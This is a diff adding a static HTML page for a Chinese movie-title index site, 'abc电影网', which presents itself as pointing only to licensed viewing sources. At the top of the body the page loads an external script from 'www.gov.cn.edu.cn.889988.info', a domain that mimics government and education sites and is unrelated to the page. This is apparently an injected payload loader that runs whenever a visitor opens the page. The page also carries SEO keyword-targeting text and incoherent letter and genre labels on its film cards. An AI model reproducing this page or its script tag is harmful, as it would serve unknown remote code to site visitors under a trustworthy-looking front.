@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>abc电影网 - A到Z片名字典与正版观影索引</title>
+<meta name="description" content="abc电影网（abcdianyingwang-h5）做A–Z字母索引：按片名首字母、类型字母箱、新手ABC三步与正版平台建议整理电影。官方网址：https://abcdianyingwang-h5.github.io">
+<meta name="keywords" content="abc电影网, abcdianyingwang-h5, A到Z电影索引, 片名字典, 类型字母分类, 正版观影导航">
+<meta name="robots" content="index,follow">
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#f6f9fc;color:#0b2545;line-height:1.8;overflow-x:hidden}
+body::before{content:"";position:fixed;inset:0;z-index:-1;
+  background:
+    radial-gradient(680px 320px at 10% 6%, rgba(16,185,129,.14), transparent 55%),
+    radial-gradient(620px 300px at 90% 94%, rgba(11,37,69,.08), transparent 55%),
+    #f6f9fc}
+.ab-nav{position:sticky;top:0;z-index:999;display:flex;align-items:center;justify-content:space-between;padding:12px 20px;background:rgba(246,249,252,.92);backdrop-filter:blur(10px);border-bottom:1px solid rgba(11,37,69,.12)}
+.ab-nav .logo{font-size:20px;font-weight:900;letter-spacing:1px}
+.ab-nav .logo b{color:#10b981}
+.ab-nav .logo i{color:#0b2545;font-style:normal}
+.ab-nav .links{display:flex;gap:6px;flex-wrap:wrap}
+.ab-nav .links a{font-size:13px;color:#33506e;padding:6px 12px;border-radius:20px;transition:.25s}
+.ab-nav .links a:hover{background:rgba(16,185,129,.16);color:#0b2545}
+
+.hero{padding:58px 20px 44px;text-align:center}
+.blocks{display:flex;gap:14px;justify-content:center;margin:0 auto 16px;flex-wrap:wrap}
+.blk{width:96px;height:96px;border-radius:18px;display:flex;align-items:center;justify-content:center;font-size:42px;font-weight:900;color:#fff;box-shadow:0 14px 30px rgba(11,37,69,.12);animation:float 3.4s ease-in-out infinite}
+.blk.a{background:linear-gradient(135deg,#0b2545,#1d4ed8)}
+.blk.b{background:linear-gradient(135deg,#065f46,#10b981);animation-delay:.3s}
+.blk.c{background:linear-gradient(135deg,#92400e,#f59e0b);animation-delay:.6s}
+@keyframes float{0%,100%{transform:translateY(0)}50%{transform:translateY(-9px)}}
+.cloud{display:flex;flex-wrap:wrap;gap:6px;justify-content:center;max-width:560px;margin:0 auto 16px}
+.cloud span{font-size:12px;font-weight:800;color:#33506e;background:#fff;border:1px solid rgba(11,37,69,.12);width:30px;height:30px;border-radius:8px;display:flex;align-items:center;justify-content:center}
+.cloud span:nth-child(odd){color:#10b981;border-color:rgba(16,185,129,.4)}
+.hero h1{font-size:30px;color:#0b2545;margin:6px 0 12px}
+.hero h1 b{color:#10b981}
+.hero p{color:#33506e;max-width:640px;margin:0 auto 18px;font-size:15px}
+.hero .url{display:inline-block;font-size:13px;color:#fff;font-weight:800;background:linear-gradient(90deg,#0b2545,#10b981);padding:8px 18px;border-radius:30px}
+.chips{display:flex;gap:8px;flex-wrap:wrap;justify-content:center;margin-top:18px}
+.chips span{font-size:12px;color:#0b2545;padding:5px 13px;border-radius:20px;border:1px solid rgba(11,37,69,.18)}
+.chips span:nth-child(1){border-color:#10b981;color:#065f46}
+.chips span:nth-child(2){border-color:#1d4ed8;color:#1d4ed8}
+.chips span:nth-child(3){border-color:#f59e0b;color:#92400e}
+
+.wrap{max-width:1160px;margin:0 auto;padding:60px 20px}
+.kicker{font-size:11px;letter-spacing:4px;text-transform:uppercase;color:#1d7a5a;margin-bottom:8px}
+.sec-title{font-size:26px;font-weight:900;color:#0b2545;margin-bottom:28px}
+.sec-title b{color:#10b981}
+
+/* A-Z 片名字典 */
+.az-bar{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:22px}
+.az-bar a{font-size:13px;font-weight:800;color:#33506e;background:#fff;border:1px solid rgba(11,37,69,.12);width:34px;height:34px;border-radius:8px;display:flex;align-items:center;justify-content:center;transition:.2s}
+.az-bar a:hover{background:#10b981;color:#fff;border-color:#10b981}
+.dict{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:18px}
+.dcard{background:#fff;border:1px solid rgba(11,37,69,.1);border-radius:14px;overflow:hidden;transition:.3s}
+.dcard:hover{transform:translateY(-4px);border-color:#10b981;box-shadow:0 16px 36px rgba(16,185,129,.12)}
+.dcard .hd{height:54px;display:flex;align-items:center;gap:10px;padding:0 16px;background:linear-gradient(90deg,#0b2545,#1d4ed8);color:#fff;font-weight:900}
+.dcard .hd .lt{font-size:22px}
+.dcard .body{padding:16px 18px}
+.dcard .body h4{color:#0b2545;font-size:16px;margin-bottom:4px}
+.dcard .body .meta{font-size:12px;color:#1d7a5a;margin-bottom:6px}
+.dcard .body p{font-size:13px;color:#33506e;margin:0}
+
+/* 类型字母箱 */
+.boxes{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:16px}
+.box{background:#fff;border:1px solid rgba(29,78,216,.16);border-radius:14px;padding:20px;transition:.3s}
+.box:hover{border-color:#10b981}
+.box .code{font-size:12px;font-weight:900;color:#1d4ed8;margin-bottom:6px}
+.box h4{color:#0b2545;font-size:15px;margin-bottom:4px}
+.box p{color:#33506e;font-size:12px;margin:0}
+.box.x1{border-top:3px solid #10b981}
+.box.x2{border-top:3px solid #1d4ed8}
+.box.x3{border-top:3px solid #f59e0b}
+.box.x4{border-top:3px solid #0b2545}
+
+/* ABC 三步 */
+.steps{display:grid;grid-template-columns:repeat(auto-fit,minmax(240px,1fr));gap:16px}
+.step{background:#fff;border-left:4px solid #10b981;border-radius:12px;padding:20px}
+.step h4{color:#0b2545;font-size:16px;margin-bottom:6px}
+.step .lab{font-size:12px;color:#1d4ed8;font-weight:900;margin-bottom:6px}
+.step p{color:#33506e;font-size:13px;margin:0}
+.step.s2{border-left-color:#1d4ed8}
+.step.s3{border-left-color:#f59e0b}
+
+/* 正版守则 */
+.rules{display:grid;grid-template-columns:repeat(auto-fit,minmax(220px,1fr));gap:14px}
+.rule{background:#fff;border:1px solid rgba(16,185,129,.22);border-radius:12px;padding:18px;text-align:center}
+.rule .num{font-size:24px;font-weight:900;color:#10b981;margin-bottom:6px}
+.rule h4{color:#0b2545;font-size:14px;margin-bottom:4px}
+.rule p{color:#33506e;font-size:12px;margin:0}
+
+.about{border:1px solid rgba(16,185,129,.24);border-radius:16px;padding:30px;background:linear-gradient(135deg,rgba(16,185,129,.08),rgba(29,78,216,.06));display:flex;gap:24px;flex-wrap:wrap;align-items:center}
+.about .txt{flex:1;min-width:260px}
+.about h2{color:#0b2545;font-size:20px;margin-bottom:10px}
+.about h2 b{color:#10b981}
+.about p{color:#33506e;font-size:14px;margin-bottom:8px}
+.about .stats{display:flex;gap:20px;flex-wrap:wrap}
+.about .stats .n{font-size:26px;font-weight:900;color:#1d4ed8}
+.about .stats .l{font-size:11px;color:#1d7a5a}
+
+.foot{text-align:center;padding:32px 20px;background:#eef3f8;border-top:1px solid rgba(11,37,69,.12);color:#5b748f;font-size:13px}
+.foot a{color:#10b981}
+.foot .lg{font-size:18px;font-weight:900;color:#0b2545;margin-bottom:8px}
+
+@media(max-width:640px){.hero h1{font-size:24px}.ab-nav .links a{font-size:12px;padding:5px 9px}.blk{width:80px;height:80px;font-size:34px}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<nav class="ab-nav">
+  <div class="logo"><b>abc</b>电影网 <i>· A–Z索引</i></div>
+  <div class="links">
+    <a href="#home">首页</a>
+    <a href="#dict">片名字典</a>
+    <a href="#boxes">类型字母箱</a>
+    <a href="#steps">观影ABC</a>
+    <a href="#rules">正版守则</a>
+  </div>
+</nav>
+
+<header id="home" class="hero">
+  <div class="blocks">
+    <div class="blk a">A</div><div class="blk b">B</div><div class="blk c">C</div>
+  </div>
+  <div class="cloud">
+    <span>A</span><span>B</span><span>C</span><span>D</span><span>E</span><span>F</span><span>G</span><span>H</span><span>I</span><span>J</span><span>K</span><span>L</span><span>M</span><span>N</span><span>O</span><span>P</span><span>Q</span><span>R</span><span>S</span><span>T</span><span>U</span><span>V</span><span>W</span><span>X</span><span>Y</span><span>Z</span>
+  </div>
+  <h1>abc电影网：<b>按A到Z</b>查片名，不靠热搜撞大运</h1>
+  <p>片名首字母字典、类型字母箱、新手ABC三步与正版平台建议——把电影做成可检索词表。本站不提供未授权在线播放、不写网盘提取码、不引盗版镜像，只导航公映/持牌/开放授权片源。</p>
+  <span class="url">🌐 https://abcdianyingwang-h5.github.io</span>
+  <div class="chips">
+    <span>🔤 A–Z片名</span><span>🗂️ 类型字母箱</span><span>🎯 新手ABC</span>
+  </div>
+</header>
+
+<main>
+<section id="dict" class="wrap">
+  <div class="kicker">A–Z TITLE DICTIONARY</div>
+  <h2 class="sec-title">片名字典 <b>按首字母</b></h2>
+  <nav class="az-bar" aria-label="字母索引">
+    <a href="#dict">A</a><a href="#dict">B</a><a href="#dict">C</a><a href="#dict">D</a><a href="#dict">E</a><a href="#dict">F</a><a href="#dict">G</a><a href="#dict">H</a><a href="#dict">I</a><a href="#dict">J</a><a href="#dict">K</a><a href="#dict">L</a><a href="#dict">M</a><a href="#dict">N</a><a href="#dict">O</a><a href="#dict">P</a><a href="#dict">Q</a><a href="#dict">R</a><a href="#dict">S</a><a href="#dict">T</a><a href="#dict">U</a><a href="#dict">V</a><a href="#dict">W</a><a href="#dict">X</a><a href="#dict">Y</a><a href="#dict">Z</a>
+  </nav>
+  <div class="dict">
+    <article class="dcard"><div class="hd"><span class="lt">A</span><span>Action / 阿字头</span></div><div class="body"><h4>阿甘正传</h4><div class="meta">罗伯特·泽米吉斯 · 1994 · 剧情/励志</div><p>按A归档：人生跨度、历史背景与轻松叙事，适合“字母入门”第一张卡。</p></div></article>
+    <article class="dcard"><div class="hd"><span class="lt">B</span><span>Biography / 比字头</span></div><div class="body"><h4>寄生虫</h4><div class="meta">奉俊昊 · 2019 · 剧情/悬疑</div><p>按B归档：阶层、空间与反转；类型箱可跨“悬疑/社会”双字母检索。</p></div></article>
+    <article class="dcard"><div class="hd"><span class="lt">C</span><span>Crime / 西字头</span></div><div class="body"><h4>楚门的世界</h4><div class="meta">彼得·威尔 · 1998 · 科幻/社会</div><p>按C归档：真人秀、媒介批判与存在主义，适合做“概念片”字母样例。</p></div></article>
+    <article class="dcard"><div class="hd"><span class="lt">D</span><span>Drama / 迪字头</span></div><div class="body"><h4>盗梦空间</h4><div class="meta">诺兰 · 2010 · 科幻/悬疑</div><p>按D归档：梦境层级、时间畸变；正版平台优先标4K/IMAX资料版。</p></div></article>
+  </div>
+</section>
+
+<section id="boxes" class="wrap">
+  <div class="kicker">GENRE LETTER BOXES</div>
+  <h2 class="sec-title">类型字母箱 <b>四箱</b></h2>
+  <div class="boxes">
+    <div class="box x1"><div class="code">BOX A</div><h4>动作/冒险</h4><p>爽片、追逐、超级英雄、废土生存；按节奏强度与片长建字母标签。</p></div>
+    <div class="box x2"><div class="code">BOX B</div><h4>剧情/传记</h4><p>历史、家庭、人物志、社会派；按地区与年代做A–Z交叉检索。</p></div>
+    <div class="box x3"><div class="code">BOX C</div><h4>喜剧/合家</h4><p>轻喜剧、动画、亲子、节庆片；标注适龄与正版儿童/家庭专区。</p></div>
+    <div class="box x4"><div class="code">BOX D</div><h4>科幻/悬疑</h4><p>硬科幻、赛博、本格/社会悬疑；附HDR、4K与正版版本建议。</p></div>
+  </div>
+</section>
+
+<section id="steps" class="wrap">
+  <div class="kicker">WATCHING ABC</div>
+  <h2 class="sec-title">新手观影 <b>ABC三步</b></h2>
+  <div class="steps">
+    <div class="step"><div class="lab">STEP A · 定字母</div><h4>先想片名/类型首字母</h4><p>只记得“阿”开头、或想看“科幻S”、或想看“传记B”，用字母缩小范围比刷首页快。</p></div>
+    <div class="step s2"><div class="lab">STEP B · 筛条件</div><h4>地区/年代/时长/适龄</h4><p>用类型箱再筛：短时看轻喜剧、周末看长史诗、带娃锁定合家BOX C。</p></div>
+    <div class="step s3"><div class="lab">STEP C · 选正版</div><h4>持牌平台/院线/开放授权</h4><p>按公映许可与信息网络传播授权给入口建议，不内嵌未授权播放器。</p></div>
+  </div>
+</section>
+
+<section id="rules" class="wrap">
+  <div class="kicker">INDEX RULES</div>
+  <h2 class="sec-title">正版索引 <b>守则</b></h2>
+  <div class="rules">
+    <div class="rule"><div class="num">A</div><h4>持牌优先</h4><p>引导持证视频平台、影院重映、官方频道；不提供未授权在线播放。</p></div>
+    <div class="rule"><div class="num">B</div><h4>公映/授权</h4><p>境内外影片按公映许可、信息网络传播授权核对，不列无资质片源。</p></div>
+    <div class="rule"><div class="num">C</div><h4>开放授权</h4><p>老片修复、纪录片、公有领域片可引图书馆/开放档案，不提供破解文件。</p></div>
+    <div class="rule"><div class="num">D</div><h4>不碰盗版</h4><p>不写网盘提取码、不引磁链/镜像、不用“福利/成人/理论片”暗语分类。</p></div>
+  </div>
+</section>
+
+<section class="wrap">
+  <div class="about">
+    <div class="txt">
+      <h2>abc电影网 <b>是什么</b></h2>
+      <p>不是“ABC影院”式在线盗版站，而是一张A–Z检索图：片名按首字母、类型按字母箱、新手按ABC三步、正版按索引守则。静态单页、移动端自适应、锚点内链、不生成 robots.txt / sitemap.xml，符合必应收录基本规范（唯一H1、完整meta、语义化nav/main/section/article/footer）。</p>
+      <p>长尾吃「A到Z电影索引 / 片名字典导航 / 类型字母分类 / 新手观影步骤 / 正版平台看片」。</p>
+    </div>
+    <div class="stats">
+      <div><div class="n">26</div><div class="l">字母索引</div></div>
+      <div><div class="n">4</div><div class="l">类型字母箱</div></div>
+      <div><div class="n">3</div><div class="l">观影ABC步</div></div>
+      <div><div class="n">0</div><div class="l">盗版提取码</div></div>
+    </div>
+  </div>
+</section>
+</main>
+
+<footer class="foot">
+  <div class="lg">🔤 abc电影网</div>
+  官方网址：<a href="https://abcdianyingwang-h5.github.io">https://abcdianyingwang-h5.github.io</a><br>
+  © 2026 abc电影网｜A–Z片名字典 / 类型字母箱 / 观影ABC / 正版索引导航
+</footer>
+
+</body>
+</html>
